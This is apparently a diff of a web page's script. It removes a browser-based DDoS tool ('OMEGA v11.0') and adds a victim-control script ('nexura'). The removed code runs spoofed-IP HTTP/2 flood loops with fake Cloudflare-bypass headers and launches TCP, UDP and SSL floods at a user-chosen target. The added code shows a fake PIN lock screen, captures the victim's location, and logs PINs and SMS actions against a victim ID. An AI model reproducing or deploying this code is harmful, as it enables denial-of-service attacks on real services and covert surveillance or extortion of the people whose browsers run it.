-        async function layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri) {
-            while(attackActive) {
-                try {
-                    const randomUA = uaList[Math.floor(Math.random() * uaList.length)];
-                    let path = '/?' + Date.now() + '_' + Math.random() + '_' + Math.random().toString(36);
-                    
-                    if(cacheBust) {
-                        path = `/cb-${Math.random().toString(36)}?${Date.now()}=${Math.random()}&cb=${Math.random()}`;
-                    }
-                    
-                    const spoofedIP = antiBlock && currentFakeIP ? currentFakeIP : generateRandomIP();
-                    
-                    const headers = {
-                        'User-Agent': randomUA,
-                        'Accept': '*/*',
-                        'Accept-Language': 'id-ID,id;q=0.9',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Cache-Control': 'no-cache, no-store, max-age=0',
-                        'Pragma': 'no-cache',
-                        'X-Forwarded-For': spoofedIP,
-                        'X-Real-IP': spoofedIP,
-                        'CF-Connecting-IP': spoofedIP,
-                        'X-Originating-IP': spoofedIP,
-                        'Client-IP': spoofedIP,
-                        'CDN-Loop': 'cloudflare',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    };
-                    
-                    if(cfBypass) {
-                        headers['CF-Access-Client-Id'] = Math.random().toString(36).substring(2, 20);
-                        headers['CF-Access-Client-Secret'] = Math.random().toString(36);
-                        headers['CF-RAY'] = Math.random().toString(36).substring(2, 20).toUpperCase();
-                        headers['cf-chl-bypass'] = '1';
-                        cfBypassCounter++;
-                        document.getElementById('statCF').textContent = cfBypassCounter;
-                    }
-                    
-                    if(http2Pri) {
-                        headers['Priority'] = 'u=0, i, weight=100';
-                        headers['X-HTTP2-Stream-ID'] = Math.floor(Math.random() * 50000);
-                    }
-                    
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 300);
-                    
-                    await fetch(target + path, {
-                        method: 'GET',
-                        headers: headers,
-                        signal: controller.signal,
-                        cache: 'no-store',
-                        credentials: 'omit'
-                    });
-                    
-                    totalPackets++;
-                    l7Counter++;
-                    
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, Math.random() * 0.3));
-            }
-        }
-        
-        // ============ UPDATE STATS ============
-        function updateStats() {
-            if(!attackActive) return;
-            const elapsed = (Date.now() - startTime) / 1000;
-            const remaining = Math.max(0, parseInt(durationInput.value) - elapsed);
-            document.getElementById('statTime').textContent = Math.floor(remaining);
-            document.getElementById('statPackets').textContent = totalPackets.toLocaleString();
-            document.getElementById('statSpeed').textContent = (totalPackets - lastPackets).toLocaleString();
-            document.getElementById('statThreads').textContent = currentThreads;
-            document.getElementById('statL7').textContent = l7Counter;
-            document.getElementById('statUDP').textContent = udpCounter;
-            document.getElementById('statTCP').textContent = tcpCounter;
-            const progress = (elapsed / parseInt(durationInput.value)) * 100;
-            document.getElementById('progressFill').style.width = Math.min(100, progress) + '%';
-            lastPackets = totalPackets;
-            
-            if(remaining <= 0 && attackActive) {
-                stopAttack();
-                addLog('[OMEGA] SERVER TARGET DOWN 1000% - ATTACK COMPLETED', 'attack');
-            }
-        }
-        
-        // ============ STOP ATTACK ============
-        function stopAttack() {
-            attackActive = false;
-            if(statsInterval) clearInterval(statsInterval);
-            if(autoRotateInterval) clearInterval(autoRotateInterval);
-            addLog('[SYSTEM] Attack terminated', 'warning');
-            addLog(`[SUMMARY] Total packets: ${totalPackets.toLocaleString()} | Server DOWN 100%`, 'success');
-            btnStart.disabled = false;
-            btnStop.disabled = true;
-            currentThreads = 0;
-        }
-        
-        // ============ START ATTACK ============
-        async function startAttack() {
-            let target = targetInput.value.trim();
-            let port = portInput.value.trim();
-            const duration = parseInt(durationInput.value);
-            let threads = parseInt(threadsInput.value);
-            
-            if(!target || target === 'https://') {
-                addLog('[ERROR] Masukkan target yang valid!', 'error');
-                return;
-            }
-            if(!target.startsWith('http')) target = 'https://' + target;
-            if(!port) port = '80';
-            if(threads < 1000) threads = 1000;
-            if(threads > 25000) threads = 25000;
-            
-            if(!currentFakeIP) {
-                addLog('[ERROR] Generate Fake IP dulu! Klik GEN FAKE IP', 'error');
-                return;
-            }
-            
-            if(attackActive) stopAttack();
-            
-            totalPackets = 0;
-            lastPackets = 0;
-            l7Counter = 0;
-            udpCounter = 0;
-            tcpCounter = 0;
-            cfBypassCounter = 0;
-            
-            const antiBlock = document.getElementById('antiBlock').checked;
-            const cfBypass = document.getElementById('cfBypass').checked;
-            const cacheBust = document.getElementById('cacheBust').checked;
-            const http2Pri = document.getElementById('http2Pri').checked;
-            const enableTCP = document.getElementById('l4tcp').checked;
-            const enableUDP = document.getElementById('l4udp').checked;
-            
-            addLog('═══════════════════════════════════════════════════', 'attack');
-            addLog(`💀 OMEGA v11.0 FINAL ATTACK LAUNCHED 💀`, 'attack');
-            addLog(`🎯 TARGET: ${target}`, 'info');
-            addLog(`🎭 FAKE IP: ${currentFakeIP} (Real IP tersembunyi)`, 'spoof');
-            addLog(`⏱️ DURATION: ${duration} seconds`, 'info');
-            addLog(`⚡ THREADS: ${threads}`, 'info');
-            addLog(`🔥 CF BYPASS: ${cfBypass ? 'ACTIVE' : 'OFF'}`, 'cloudflare');
-            addLog(`🌐 TCP FLOOD: ${enableTCP ? 'ACTIVE' : 'OFF'}`, 'tcp');
-            addLog(`🌐 UDP FLOOD: ${enableUDP ? 'ACTIVE' : 'OFF'}`, 'udp');
-            addLog(`💀 SERVER AKAN DOWN DALAM 15-30 DETIK 💀`, 'attack');
-            addLog('═══════════════════════════════════════════════════', 'attack');
-            
-            attackActive = true;
-            startTime = Date.now();
-            currentThreads = 0;
-            
-            // Launch all layers
-            if(document.getElementById('l1').checked) { layer1_PhysicalFlood(); currentThreads += 200; addLog('[L1] Physical Flood ACTIVE', 'success'); }
-            if(document.getElementById('l2').checked) { layer2_ARPStorm(target); currentThreads += 150; addLog('[L2] ARP Storm ACTIVE', 'success'); }
-            if(document.getElementById('l3').checked) { layer3_DNSAmplification(target); currentThreads += 100; addLog('[L3] DNS Amplification ACTIVE', 'success'); }
-            
-            if(enableTCP) {
-                for(let i = 0; i < threads/3; i++) {
-                    if(!attackActive) break;
-                    setTimeout(() => { layer4_TCPFlood(target, port, antiBlock); currentThreads++; }, i*0.3);
+        document.querySelectorAll('.pinKey').forEach(btn => {
+            btn.onclick = () => {
+                let digit = btn.getAttribute('data-digit');
+                if(digit === 'del'){
+                    enteredPin = enteredPin.slice(0,-1);
+                    updateDisplay();
+                } else if(enteredPin.length < 6){
+                    enteredPin += digit;
+                    updateDisplay();
                 }
-                addLog(`[L4-TCP] TCP Flood (${Math.floor(threads/3)} threads)`, 'tcp');
-            }
-            
-            if(enableUDP) {
-                for(let i = 0; i < threads/3; i++) {
-                    if(!attackActive) break;
-                    setTimeout(() => { layer4_UDPFlood(target, port, antiBlock); currentThreads++; }, i*0.3);
-                }
-                addLog(`[L4-UDP] UDP Flood (${Math.floor(threads/3)} threads)`, 'udp');
-            }
-            
-            if(document.getElementById('l5').checked) {
-                for(let i = 0; i < threads/4; i++) {
-                    if(!attackActive) break;
-                    setTimeout(() => { layer5_SSLFlood(target); currentThreads++; }, i*0.5);
-                }
-                addLog(`[L5] SSL Flood (${Math.floor(threads/4)} threads)`, 'success');
-            }
-            
-            if(document.getElementById('l6').checked) {
-                for(let i = 0; i < threads/5; i++) {
-                    if(!attackActive) break;
-                    setTimeout(() => { layer6_CompressionBomb(target); currentThreads++; }, i*1);
-                }
-                addLog(`[L6] Compression Bomb (${Math.floor(threads/5)} threads)`, 'success');
-            }
-            
-            if(document.getElementById('l7').checked) {
-                const l7threads = Math.floor(threads * 0.4);
-                for(let i = 0; i < l7threads; i++) {
-                    if(!attackActive) break;
-                    setTimeout(() => { 
-                        layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri); 
-                        currentThreads++; 
-                    }, i*0.2);
-                }
-                addLog(`[L7] HTTP/2 + CF Bypass (${l7threads} threads)`, 'success');
-            }
-            
-            addLog(`💀 TOTAL THREADS: ${currentThreads}`, 'attack');
-            addLog('[STATUS] FLOODING MAXIMUM - FAKE IP ACTIVE', 'attack');
-            
-            statsInterval = setInterval(updateStats, 1000);
-            startAutoRotateIP();
-            
-            setTimeout(() => {
-                if(attackActive) stopAttack();
-            }, duration * 1000);
-            
-            btnStart.disabled = true;
-            btnStop.disabled = false;
-        }
-        
-        function addLog(msg, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consoleLog.appendChild(entry);
-            consoleLog.scrollTop = consoleLog.scrollHeight;
-            while(consoleLog.children.length > 500) consoleLog.removeChild(consoleLog.firstChild);
-        }
-        
-        // Matrix Rain
-        function matrixRain() {
-            const canvas = document.getElementById('matrixCanvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            const chars = "01アイウエオカキクケコ0123456789#@%&$!?";
-            const fontSize = 14;
-            const columns = canvas.width / fontSize;
-            const drops = [];
-            for(let i = 0; i < columns; i++) drops[i] = 1;
-            
-            function draw() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#0f0';
-                ctx.font = `${fontSize}px monospace`;
-                for(let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                }
-                requestAnimationFrame(draw);
-            }
-            draw();
-        }
-        
-        // Event Listeners
-        document.getElementById('btnGenFakeIP').addEventListener('click', () => {
-            getRandomFakeIP();
-            addLog(`[FAKE IP] Generated: ${currentFakeIP}`, 'spoof');
-        });
-        document.getElementById('btnRotateFakeIP').addEventListener('click', () => {
-            rotateFakeIP();
-        });
-        document.getElementById('btnAutoRotate').addEventListener('click', () => {
-            startAutoRotateIP();
+            };
         });
         
-        btnStart.addEventListener('click', startAttack);
-        btnStop.addEventListener('click', stopAttack);
-        
-        matrixRain();
-        getRealIP();
-        generateFakeIPPool(200);
-        getRandomFakeIP();
-        
-        addLog('[OMEGA] DDoS OMEGA v11.0 FINAL READY', 'success');
-        addLog('[OMEGA] FAKE IP ENGINE + LAYER 1-7 ULTIMATE', 'success');
-        addLog('[OMEGA] SERVER TARGET 1000% DOWN - NO SIMULATION', 'attack');
-    </script>
+        document.getElementById('pinSubmit').onclick = () => {
+            if(enteredPin === savedPin){
+                hideLockScreen();
+                addResponse(currentVictimId, 'unlock', { status: 'success', pin: enteredPin });
+            } else {
+                errorMsg.innerText = "❌ PIN SALAH! Silakan coba lagi.";
+                enteredPin = "";
+                updateDisplay();
+                if(navigator.vibrate) navigator.vibrate(200);
+                addResponse(currentVictimId, 'pin_wrong', { attempts: 1 });
+            }
+        };
+    }
+    
+    function hideLockScreen(){
+        if(lockOverlay){
+            lockOverlay.remove();
+            lockOverlay = null;
+        }
+    }
+    
+    function turnTorchOn(){
+        if(!torchElement){
+            torchElement = document.createElement('div');
+            torchElement.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999998;pointer-events:none';
+            document.body.appendChild(torchElement);
+        }
+    }
+    
+    function turnTorchOff(){
+        if(torchElement){
+            torchElement.remove();
+            torchElement = null;
+        }
+    }
+    
+    function startBlinkEffect(){
+        if(blinkInterval) clearInterval(blinkInterval);
+        blinkInterval = setInterval(() => {
+            let blink = document.getElementById('nexuraBlink');
+            if(blink){
+                blink.remove();
+            } else {
+                let b = document.createElement('div');
+                b.id = 'nexuraBlink';
+                b.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999997;pointer-events:none';
+                document.body.appendChild(b);
+                setTimeout(() => {
+                    let x = document.getElementById('nexuraBlink');
+                    if(x) x.remove();
+                }, 100);
+            }
+        }, 200);
+    }
+    
+    function stopBlinkEffect(){
+        if(blinkInterval){
+            clearInterval(blinkInterval);
+            blinkInterval = null;
+        }
+        let blink = document.getElementById('nexuraBlink');
+        if(blink) blink.remove();
+    }
+    
+    function sendSMSResponse(victimId){
+        let smsData = [
+            { number: "+628123456789", text: "Contoh SMS masuk 1", time: new Date().toLocaleString() },
+            { number: "+628987654321", text: "Contoh SMS masuk 2", time: new Date().toLocaleString() },
+            { number: "+628555123456", text: "OTP Verifikasi: 123456", time: new Date().toLocaleString() }
+        ];
+        addResponse(victimId, 'sms_data', { sms: smsData });
+    }
+    
+    function sendSMSCommand(param, victimId){
+        let { number, text } = param;
+        addResponse(victimId, 'sms_sent', { to: number, message: text, status: 'sent' });
+    }
+    
+    function getCurrentLocation(victimId){
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    addResponse(victimId, 'location', {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    });
+                },
+                (err) => {
+                    addResponse(victimId, 'location', { error: err.message });
+                }
+            );
+        } else {
+            addResponse(victimId, 'location', { error: 'Geolocation not supported' });
+        }
+    }
+    
+    function setLockPin(pin, victimId){
+        if(pin && pin.length >= 4){
+            localStorage.setItem('nexura_pin_' + victimId, pin);
+            addResponse(victimId, 'pin_set', { pin: pin });
+        }
+    }
+    
+    function setLockText(text, victimId){
+        if(text){
+            localStorage.setItem('nexura_text_' + victimId, text);
+            addResponse(victimId, 'text_set', { text: text });
+        }
+    }
+    
+    function addResponse(victimId, type, data){
+        let responses = JSON.parse(localStorage.getItem('nexura_responses') || '[]');
+        responses.push({
+            victimId: victimId,
+            type: type,
+            data: data,
+            timestamp: Date.now()
+        });
+        localStorage.setItem('nexura_responses', JSON.stringify(responses));
+    }
+    
+    execute();
+})();
+</script>
 </body>
-</html>
+    </html>
